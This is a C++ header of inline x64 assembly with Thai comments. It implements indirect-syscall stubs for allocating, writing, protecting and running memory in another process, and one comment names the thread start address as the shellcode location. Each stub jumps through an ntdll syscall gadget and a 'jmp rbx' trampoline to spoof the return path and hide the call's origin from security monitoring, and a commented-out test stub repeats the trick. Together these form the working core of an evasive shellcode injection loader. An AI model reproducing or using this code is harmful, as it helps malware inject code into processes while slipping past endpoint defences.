#pragma once
#include "DefStack.h"

// อันนี้เอาไว้ทดสอบ
/*extern "C" __attribute__((naked)) NTSTATUS test(
	PVOID TargetAPI,	// RCX
	PVOID Gadget,		// RDX
	PVOID Arg1			// R8
) {
	__asm {
		
		push rbx        // เรา push rbx ก่อนเพื่อสำรอง non-volatile เพราะเราจะใช้เก็บ ReturnHere หลัง Faking Stack แล้ว
		
		// จากนั้นเราย้าย rcx, rdx ไป r10 - 11 ชั่วคราวเพื่อเตรียมใช้ API และ Gadget สำหรับ Indirect ตามลำดับ
		// ย้าย r8 ที่เป็นคำสั่ง (arg1) แรก ไปหา rcx ตามกฎ Calling Convnetion

		mov r10, rcx    
		mov r11, rdx    
		mov rcx, r8		// <--- ย้าย arg1 เข้า parameter แรก aka RCX   

		lea rbx, [rip + ReturnHere]	// โหลดพิกัด ReturnHere ตั้งเข็มทิศให้ Gadget รู้ว่าต้องดีดกลับมาที่ไหน

		sub rsp, 0x28	// จอง Shadow Stack สำหรับ Register 4 ตัวแรก (rcx, rdx, r8, r9) และ Padding 8 bytes ให้ R11
						// หรือ 32 + 8 = 40 bytes หรือ 0x28

		mov [rsp], r11	// ดัน r11 ที่เป็น Gadget สำหรับการกระโดดครั้งที่ 2 ไว้บนสุดของ Stack

		jmp r10			// กระโดดเข้า Target API เพื่อทำงานจริง เช่น VirtualAlloc 

		// ---------------------------------------------------------

		// เพื่อให้เข้าใจว่าทำไมถึงต้องมี lea rbx, [ReturnHere] ลองดูเส้นทางการเดินทางของ CPU 
		// 1. Stub -> jmp r10 : เรากระโดดเข้าไปใน TargetApi(เช่น Sleep)
		// 2. ภายใน API : API ทำงานจนจบ แล้วสั่ง ret
		// 3. API -> Gadget : เนื่องจากเรา push r11 ไว้ก่อนหน้า พอ API สั่ง ret 
		//	  มันเลยเด้งไปที่ Gadget(jmp rbx) ใน ntdll
		// 4. Gadget -> ReturnHere : Gadget สั่ง jmp rbx ซึ่งใน RBX เราเก็บค่า ReturnHere ไว้
		//	  CPU เลยดีดกลับมาหาเราที่บ้านอย่างปลอดภัย!

		// ---------------------------------------------------------

	ReturnHere:			// เมื่อ API ทำงานเสร็จ มันจะ RET -> วิ่งไปหา Gadget -> JMP RBX กลับมาที่นี่!

		// Cleanup หลังจบงาน
		// คืนพื้นที่: 32 bytes (จาก sub rsp = rcx, rdx, r8, r9) ก็พอ เพราะหลังจาก Ret แล้ว 
		// WinAPI โดดไปหา Gadget แล้ว OS ดีดเอา 8 bytes ที่จองไว้ออกไปด้วย Stack เลื่อนกลับมา 32 bytes เหมือนเดิม
		
		add rsp, 0x20

		pop rbx			// คืน RBX เดิมกลับเข้าระบบ

		ret				// RET กลับมาหา Loader ของเรา
	}
}*/

// -----------------------------------------------------------------------------------------------------

extern "C" __attribute__((naked)) NTSTATUS NtAllocate(
	HANDLE ProcessHandle,       // RCX		  (Arg 1)
	PVOID* BaseAddress,         // RDX		  (Arg 2)
	ULONG_PTR ZeroBits,         // R8		  (Arg 3)
	PSIZE_T RegionSize,         // R9		  (Arg 4)
	ULONG AllocationType,       // [RSP+0x28] (Arg 5)
	ULONG Protect,              // [RSP+0x30] (Arg 6)
	DWORD SSN,                  // [RSP+0x38] (Arg 7 | Key 1)
	PVOID SyscallGadget,        // [RSP+0x40] (Arg 8 | Key 2)
	PVOID TrampolineGadget      // [RSP+0x48] (Arg 9 | Key 3)
) {
	__asm {
		// 1. จองพื้นที่ 64 bytes สำหรับ 9 Arg/Parameter
		// โดยจุดนี้จะนับรวม Arg 1-4 ตามมาตราฐาน 0x00-0x20
		sub rsp, 0x50

		// 2. เซฟ RBX ไว้ที่ชั้นล่างสุด aka Non-volatile 
		// ตำแหน่งจริงคือ 0x28
		mov[rsp + 0x48], rbx

		// 3. ย้าย API Arguments (5 และ 6)
		mov r10, [rsp + 0x78]
		mov[rsp + 0x28], r10

		mov r10, [rsp + 0x80]
		mov[rsp + 0x30], r10

		// 4. ติดตั้ง 3 กุญแจศักดิ์สิทธิ์

		// Key 1 SSN (Arg 7) -> ต้องเป็น 0x88
		mov eax, dword ptr[rsp + 0x88]

		// ย้าย rcx เข้า ตามกฎ Syscall เป็นตัวที่ 1 
		mov r10, rcx

		// ผูกเชือก Return
		lea rbx, [rip + ReturnHere]

		// Key 3 JmpRbx Gadget หรือ Trampoline Gadget  (Arg 9) -> ต้องเป็น 0x98
		mov r11, [rsp + 0x98]
		mov[rsp], r11

		// Key 2 Syscall Gadget (Arg 8) -> ต้องเป็น 0x90
		// (ห้ามสลับกับ SSN ไม่งั้นมันจะโดดไปหา 0x18 อีก!)
		mov r11, [rsp + 0x90]
		jmp r11

		ReturnHere :
		// 5. Cleanup: คืนค่า RBX และ RSP
		mov rbx, [rsp + 0x48]  // ขยับตาม RSP ที่โดน ret ไป 8
		add rsp, 0x50		   // คืนพื้นที่ทั้งหมด
		ret
	}
}

// ==============================================================================================

extern "C" __attribute__((naked)) NTSTATUS NtWrite(
	HANDLE ProcessHandle,
	PVOID BaseAddress,
	PVOID Buffer,
	SIZE_T NumberOfBytesToWrite,
	PSIZE_T NumberOfBytesWritten,
	DWORD SSN,                  
	PVOID SyscallGadget,        
	PVOID TrampolineGadget      
) {
	__asm {
		
		sub rsp, 0x48
		
		mov[rsp + 0x40], rbx
		
		mov r10, [rsp + 0x70]
		mov[rsp + 0x28], r10

		mov eax, dword ptr[rsp + 0x78]

		mov r10, rcx
		
		lea rbx, [rip + ReturnHere]

		mov r11, [rsp + 0x88]
		mov[rsp], r11
		
		mov r11, [rsp + 0x80]
		jmp r11

		ReturnHere :
		
		mov rbx, [rsp + 0x40]  
		add rsp, 0x48		   
		ret
	}
}

// ==============================================================================================

extern "C" __attribute__((naked)) NTSTATUS NtProtect(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	PSIZE_T RegionSize,
	ULONG NewProtection,
	PULONG OldProtection,
	DWORD SSN,
	PVOID SyscallGadget,
	PVOID TrampolineGadget
) {
	__asm {

		sub rsp, 0x48

		mov[rsp + 0x40], rbx

		mov r10, [rsp + 0x70]
		mov[rsp + 0x28], r10

		mov eax, dword ptr[rsp + 0x78]

		mov r10, rcx

		lea rbx, [rip + ReturnHere]

		mov r11, [rsp + 0x88]
		mov[rsp], r11

		mov r11, [rsp + 0x80]
		jmp r11

		ReturnHere :

		mov rbx, [rsp + 0x40]
			add rsp, 0x48
			ret
	}
}

// ==============================================================================================

extern "C" __attribute__((naked)) NTSTATUS NtCreate(
	PHANDLE hThread,
	DWORD AccessMask,
	PVOID ObjAttrbt,
	HANDLE ProcessHandle,
	PVOID lpStartAddress,   // ที่อยู่ Shellcode (pAddress)
	PVOID lpParameter,
	ULONG Flags,
	SIZE_T StackZeroBits,
	SIZE_T SizeOfStackCommit,
	SIZE_T SizeOfStackReserve,
	PVOID lpBytesBuffer,
	DWORD SSN,                  
	PVOID SyscallGadget,        
	PVOID TrampolineGadget      
) {
	__asm {
		
		sub rsp, 0x78

		mov[rsp + 0x70], rbx

		mov r10, [rsp + 0xA0]
		mov[rsp + 0x28], r10

		mov r10, [rsp + 0xA8]
		mov[rsp + 0x30], r10

		mov r10, [rsp + 0xB0]
		mov[rsp + 0x38], r10

		mov r10, [rsp + 0xB8]
		mov[rsp + 0x40], r10

		mov r10, [rsp + 0xC0]
		mov[rsp + 0x48], r10

		mov r10, [rsp + 0xC8]
		mov[rsp + 0x50], r10

		mov r10, [rsp + 0xD0]
		mov[rsp + 0x58], r10

		mov eax, dword ptr[rsp + 0xD8]

		mov r10, rcx

		lea rbx, [rip + ReturnHere]

		mov r11, [rsp + 0xE8]
		mov[rsp], r11

		mov r11, [rsp + 0xE0]
		jmp r11

		ReturnHere :

		mov rbx, [rsp + 0x70]  
		add rsp, 0x78		   
		ret
	}
}